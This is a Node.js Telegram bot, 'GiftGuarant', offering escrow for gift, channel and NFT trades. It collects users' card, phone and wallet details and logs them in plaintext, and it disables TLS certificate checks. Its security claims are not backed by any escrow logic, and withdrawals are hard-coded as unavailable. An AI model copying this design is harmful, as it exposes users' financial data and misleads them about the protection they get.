require('dotenv').config();
const { Telegraf, Markup, Scenes, session } = require('telegraf');
const { Pool } = require('pg');

// Подключение к базе
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

// Бот
const bot = new Telegraf(process.env.BOT_TOKEN);

// SQL
async function dbQuery(query, params = []) {
  try { 
    const result = await pool.query(query, params);
    return result;
  }
  catch (e) { 
    console.error('DB error:', e.message, 'Query:', query); 
    throw e; 
  }
}

// Инициализация таблиц
async function initDB() {
  try {
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        user_id BIGINT UNIQUE NOT NULL,
        username VARCHAR(255),
        first_name VARCHAR(255),
        last_name VARCHAR(255),
        requisites TEXT,
        balance DECIMAL(15,2) DEFAULT 0,
        successful_deals INTEGER DEFAULT 0,
        is_banned BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY,
        deal_id VARCHAR(50) UNIQUE NOT NULL,
        seller_id BIGINT NOT NULL,
        buyer_id BIGINT,
        deal_type VARCHAR(50) NOT NULL,
        product_info TEXT NOT NULL,
        currency VARCHAR(20),
        amount DECIMAL(15,2),
        deal_link TEXT NOT NULL,
        status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    await dbQuery(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id SERIAL PRIMARY KEY,
        user_id BIGINT NOT NULL,
        requisites TEXT NOT NULL,
        amount DECIMAL(15,2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('✅ Таблицы созданы');
  } catch (error) {
    console.error('❌ Ошибка создания таблиц:', error);
  }
}

// Сцены
const requisitesScene = new Scenes.BaseScene('requisites');
const createDealScene = new Scenes.BaseScene('createDeal');
const withdrawScene = new Scenes.BaseScene('withdraw');
const stage = new Scenes.Stage([requisitesScene, createDealScene, withdrawScene]);
bot.use(session());
bot.use(stage.middleware());

// Фото
const IMAGES = {
  main: 'https://i.ibb.co/XkCzqRyz/main.png',
  deals: 'https://i.ibb.co/rGgjz61s/deals.png',
  createDeal: 'https://i.ibb.co/n2ysqQ9/create.png',
  requisites: 'https://i.ibb.co/0yvxs921/requisites.png'
};

// Умная отправка/редактирование сообщения
async function sendOrEdit(ctx, image, caption, buttons) {
  try {
    if (ctx.session?.lastMessageId) {
      try {
        await ctx.telegram.editMessageMedia(ctx.chat.id, ctx.session.lastMessageId, undefined, { 
          type: 'photo', 
          media: image, 
          caption, 
          parse_mode: 'Markdown' 
        });
        await ctx.telegram.editMessageReplyMarkup(ctx.chat.id, ctx.session.lastMessageId, undefined, buttons.reply_markup);
        return;
      } catch (e) {
        // Если редактирование не удалось, отправляем новое сообщение
        console.log('Не удалось редактировать сообщение, отправляем новое');
      }
    }
    const msg = await ctx.replyWithPhoto(image, { 
      caption, 
      parse_mode: 'Markdown', 
      ...buttons 
    });
    if (ctx.session) {
      ctx.session.lastMessageId = msg.message_id;
    }
  } catch (error) {
    console.error('Ошибка отправки сообщения:', error);
    // Пытаемся отправить просто текст если фото не работает
    await ctx.reply(caption, { 
      parse_mode: 'Markdown', 
      ...buttons 
    });
  }
}

// Главное меню
async function showMainMenu(ctx) {
  const caption = `🎯 *GiftGuarant*\n🛡️ Надёжный сервис для безопасных сделок\n\n✨ *Преимущества:*\n✅ Без комиссии\n✅ Поддержка 24/7\n✅ Полная безопасность\n✅ Мгновенные сделки\n\n💫 Ваши сделки под защитой! 🛡️`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('💰 Мои реквизиты', 'requisites')],
    [Markup.button.callback('💼 Создать сделку', 'createDeal')],
    [Markup.button.callback('🗒️ Мои сделки', 'myDeals')],
    [Markup.button.callback('⚙️ Настройки', 'settings')]
  ]);
  await sendOrEdit(ctx, IMAGES.main, caption, buttons);
}

// Реквизиты - УПРОЩЕННАЯ ВЕРСИЯ
requisitesScene.enter(async (ctx) => {
  const caption = `💳 *Добавление реквизитов*\n\n📝 *Пришлите ваши реквизиты в формате:*\n• Номер карты\n• Номер телефона  \n• Крипто-кошелек\n\n*Пример:*\nКарта: 1234 5678 9012 3456\nТелефон: +79991234567\nКрипто: UQB123...abc`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⏪ Назад', 'mainMenu')]
  ]);
  await sendOrEdit(ctx, IMAGES.requisites, caption, buttons);
});

requisitesScene.on('text', async (ctx) => {
  try {
    const requisites = ctx.message.text;
    
    // Простая валидация - проверяем что текст не пустой
    if (!requisites || requisites.trim().length < 10) {
      await ctx.reply('❌ Реквизиты слишком короткие. Минимум 10 символов.');
      return;
    }
    
    console.log('Сохранение реквизитов для пользователя:', ctx.from.id, 'Реквизиты:', requisites);
    
    // Сохраняем реквизиты
    await dbQuery(
      `INSERT INTO users (user_id, username, first_name, last_name, requisites, updated_at) 
       VALUES ($1, $2, $3, $4, $5, NOW()) 
       ON CONFLICT (user_id) 
       DO UPDATE SET requisites = $5, updated_at = NOW()`,
      [
        ctx.from.id, 
        ctx.from.username || '', 
        ctx.from.first_name || '', 
        ctx.from.last_name || '', 
        requisites
      ]
    );
    
    await ctx.reply('✅ Реквизиты успешно сохранены!');
    await showMainMenu(ctx);
    return ctx.scene.leave();
    
  } catch (error) {
    console.error('Ошибка сохранения реквизитов:', error);
    await ctx.reply('❌ Ошибка сохранения реквизитов. Попробуйте позже.');
  }
});

// Создание сделки
createDealScene.enter(async (ctx) => {
  const caption = `🛍️ *Создание сделки*\n\nВыберите тип товара:`;
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🎁 Подарки', 'deal_gifts')],
    [Markup.button.callback('📢 Канал', 'deal_channel')],
    [Markup.button.callback('🆕 NFT Активы', 'deal_nft')],
    [Markup.button.callback('⏪ Назад', 'mainMenu')]
  ]);
  await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
});

// Выбор типа сделки
bot.action(/deal_(.+)/, async (ctx) => {
  try {
    if (!ctx.session) ctx.session = {};
    ctx.session.dealType = ctx.match[1];
    const caption = `Вы выбрали: *${getDealTypeText(ctx.session.dealType)}*\n\n📝 Введите описание товара:`;
    const buttons = Markup.inlineKeyboard([
      [Markup.button.callback('⏪ Назад', 'createDeal')]
    ]);
    await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора типа сделки:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Ввод описания, валюты, суммы
createDealScene.on('text', async (ctx) => {
  try {
    if (!ctx.session) ctx.session = {};
    
    if (!ctx.session.productInfo) {
      ctx.session.productInfo = ctx.message.text;
      const caption = `💵 Выберите валюту:`;
      const buttons = Markup.inlineKeyboard([
        [Markup.button.callback('💎 TON', 'currency_TON'), Markup.button.callback('💵 USDT', 'currency_USDT')],
        [Markup.button.callback('⭐️ STARS', 'currency_STARS'), Markup.button.callback('🇷🇺 RUB', 'currency_RUB')],
        [Markup.button.callback('⏪ Назад', 'createDeal')]
      ]);
      await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
      return;
    }
    
    if (ctx.session.waitAmount) {
      const amount = parseFloat(ctx.message.text.replace(',', '.'));
      if (isNaN(amount) || amount <= 0) { 
        await ctx.reply('❌ Введите корректную сумму (больше 0)'); 
        return; 
      }
      ctx.session.amount = amount;

      const dealId = Math.random().toString(36).substring(2,8).toUpperCase();
      const dealLink = `https://t.me/${ctx.botInfo.username}?start=deal_${dealId}`;
      
      await dbQuery(
        `INSERT INTO deals (deal_id, seller_id, deal_type, product_info, currency, amount, deal_link) 
         VALUES ($1, $2, $3, $4, $5, $6, $7)`,
        [dealId, ctx.from.id, ctx.session.dealType, ctx.session.productInfo, ctx.session.currency, ctx.session.amount, dealLink]
      );

      const caption = `🎉 *Сделка создана!*\n\n📋 ID: ${dealId}\n🎯 Тип: ${getDealTypeText(ctx.session.dealType)}\n💰 Сумма: ${ctx.session.amount} ${ctx.session.currency}\n🔗 Ссылка: ${dealLink}`;
      const buttons = Markup.inlineKeyboard([
        [Markup.button.callback('⏪ Главное меню', 'mainMenu')]
      ]);
      await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);

      // Очищаем сессию
      delete ctx.session.productInfo;
      delete ctx.session.currency;
      delete ctx.session.amount;
      delete ctx.session.waitAmount;
      delete ctx.session.dealType;
      
      return ctx.scene.leave();
    }
  } catch (error) {
    console.error('Ошибка создания сделки:', error);
    await ctx.reply('❌ Ошибка создания сделки. Попробуйте позже.');
  }
});

// Выбор валюты
bot.action(/currency_(.+)/, async (ctx) => {
  try {
    if (!ctx.session) ctx.session = {};
    ctx.session.currency = ctx.match[1];
    ctx.session.waitAmount = true;
    const caption = `Введите сумму сделки в ${ctx.session.currency}:`;
    const buttons = Markup.inlineKeyboard([
      [Markup.button.callback('⏪ Назад', 'createDeal')]
    ]);
    await sendOrEdit(ctx, IMAGES.createDeal, caption, buttons);
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка выбора валюты:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Мои сделки
bot.action('myDeals', async (ctx) => {
  try {
    const result = await dbQuery(
      'SELECT * FROM deals WHERE seller_id = $1 ORDER BY created_at DESC LIMIT 10', 
      [ctx.from.id]
    );
    
    if (!result.rows.length) {
      const caption = `📭 *У вас пока нет сделок*\n\nСоздайте первую сделку!`;
      const buttons = Markup.inlineKeyboard([
        [Markup.button.callback('💼 Создать сделку', 'createDeal')],
        [Markup.button.callback('⏪ Назад', 'mainMenu')]
      ]);
      return await sendOrEdit(ctx, IMAGES.deals, caption, buttons);
    }
    
    // Показываем только первую сделку для простоты
    const deal = result.rows[0];
    const caption = `📋 *Сделка #${deal.deal_id}*\n🎯 Тип: ${getDealTypeEmoji(deal.deal_type)} ${getDealTypeText(deal.deal_type)}\n💰 Сумма: ${deal.amount || 0} ${deal.currency || ''}\n📊 Статус: ${getStatusEmoji(deal.status)} ${deal.status}\n🕐 Создана: ${new Date(deal.created_at).toLocaleDateString('ru-RU')}`;
    const buttons = Markup.inlineKeyboard([
      [Markup.button.url('📱 Открыть сделку', deal.deal_link)],
      [Markup.button.callback('⏪ Назад', 'mainMenu')]
    ]);
    await sendOrEdit(ctx, IMAGES.deals, caption, buttons);
    
    await ctx.answerCbQuery();
  } catch (e) { 
    console.error('Ошибка загрузки сделок:', e);
    await ctx.reply('❌ Ошибка загрузки сделок');
    await ctx.answerCbQuery();
  }
});

// Настройки
bot.action('settings', async (ctx) => {
  try {
    const userRes = await dbQuery(
      'SELECT balance, successful_deals, requisites FROM users WHERE user_id = $1', 
      [ctx.from.id]
    );
    const user = userRes.rows[0] || { balance: 0, successful_deals: 0, requisites: 'не указаны' };
    
    const caption = `⚙️ *Настройки*\n\n💰 Баланс: ${user.balance}₽\n✅ Успешных сделок: ${user.successful_deals}\n💳 Реквизиты: ${user.requisites && user.requisites !== 'не указаны' ? 'указаны' : 'не указаны'}`;
    const buttons = Markup.inlineKeyboard([
      [Markup.button.callback('💰 Пополнить баланс', 'deposit')],
      [Markup.button.callback('🏦 Вывести средства', 'withdraw')],
      [Markup.button.callback('✏️ Изменить реквизиты', 'requisites')],
      [Markup.button.callback('⏪ Назад', 'mainMenu')]
    ]);
    await sendOrEdit(ctx, IMAGES.main, caption, buttons);
    await ctx.answerCbQuery();
  } catch (error) {
    console.error('Ошибка настроек:', error);
    await ctx.answerCbQuery('❌ Ошибка');
  }
});

// Обработчики действий
bot.action('mainMenu', async (ctx) => {
  await showMainMenu(ctx);
  await ctx.answerCbQuery();
});

bot.action('requisites', async (ctx) => {
  await ctx.scene.enter('requisites');
  await ctx.answerCbQuery();
});

bot.action('createDeal', async (ctx) => {
  await ctx.scene.enter('createDeal');
  await ctx.answerCbQuery();
});

bot.action('deposit', async (ctx) => {
  await ctx.reply('💰 Для пополнения баланса обратитесь к администратору: @admin');
  await ctx.answerCbQuery();
});

bot.action('withdraw', async (ctx) => {
  await ctx.reply('🏦 Функция вывода средств временно недоступна');
  await ctx.answerCbQuery();
});

// /start - УПРОЩЕННАЯ ВЕРСИЯ
bot.start(async (ctx) => {
  try {
    console.log('Получен /start от пользователя:', ctx.from.id, ctx.from.username);
    
    // Простая регистрация пользователя
    await dbQuery(
      `INSERT INTO users (user_id, username, first_name, last_name) 
       VALUES ($1, $2, $3, $4) 
       ON CONFLICT (user_id) DO NOTHING`,
      [
        ctx.from.id, 
        ctx.from.username || '', 
        ctx.from.first_name || '', 
        ctx.from.last_name || ''
      ]
    );
    
    console.log('Пользователь зарегистрирован:', ctx.from.id);
    await showMainMenu(ctx);
    
  } catch (error) {
    console.error('Критическая ошибка при /start:', error);
    // Пытаемся отправить хотя бы простое сообщение
    try {
      await ctx.reply('🎯 Добро пожаловать в GiftGuarant! 🛡️\n\nИспользуйте кнопки меню для навигации.');
    } catch (e) {
      console.error('Не удалось отправить сообщение об ошибке');
    }
  }
});

// Вспомогательные функции
function getDealTypeText(type) { 
  const types = { 'gifts': 'Подарки', 'channel': 'Канал', 'nft': 'NFT Активы' }; 
  return types[type] || type; 
}

function getDealTypeEmoji(type) { 
  const emojis = { 'gifts': '🎁', 'channel': '📢', 'nft': '🆕' }; 
  return emojis[type] || '💼'; 
}

function getStatusEmoji(status) { 
  const emojis = { 'active': '🟢', 'paid': '🟡', 'completed': '🔵', 'cancelled': '🔴' }; 
  return emojis[status] || '⚪'; 
}

// Обработка ошибок
bot.catch((err, ctx) => {
  console.error(`Ошибка для ${ctx.updateType}:`, err);
});

// Запуск
initDB().then(() => {
  console.log('✅ База данных инициализирована');
  bot.launch().then(() => {
    console.log('✅ Бот запущен');
  }).catch(err => {
    console.error('❌ Ошибка запуска бота:', err);
  });
}).catch(err => {
  console.error('❌ Ошибка инициализации БД:', err);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
